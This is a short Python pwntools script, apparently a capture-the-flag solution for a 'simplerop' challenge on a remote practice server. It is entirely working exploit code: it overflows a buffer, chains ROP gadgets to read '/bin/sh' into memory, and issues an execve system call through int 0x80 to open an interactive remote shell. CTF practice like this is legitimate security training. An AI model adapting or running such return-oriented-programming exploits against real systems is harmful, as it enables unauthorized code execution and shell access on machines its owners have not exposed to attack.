# method two

from pwn import *


# p = process("./simplerop")
p = remote("node4.buuoj.cn", 27918)

pop_eax_ret = 0x080bae06 
pop_edx_ecx_ebx_ret = 0x0806e850
int_0x80 = 0x080493e1 
read = 0x0806CD5A
bss_addr = 0x080EAF80

# ropchain
pad = cyclic(0x14+0x4*3)
pad += p32(read)+p32(pop_edx_ecx_ebx_ret)
pad += p32(0)+p32(bss_addr)+p32(0x8)
pad += p32(pop_edx_ecx_ebx_ret)
pad += p32(0)+p32(0)+p32(bss_addr)
pad += p32(pop_eax_ret)+p32(0xb)
pad += p32(int_0x80)
print("len: ", len(pad))
p.send(pad)
p.send("/bin/sh\x00")

p.interactive()

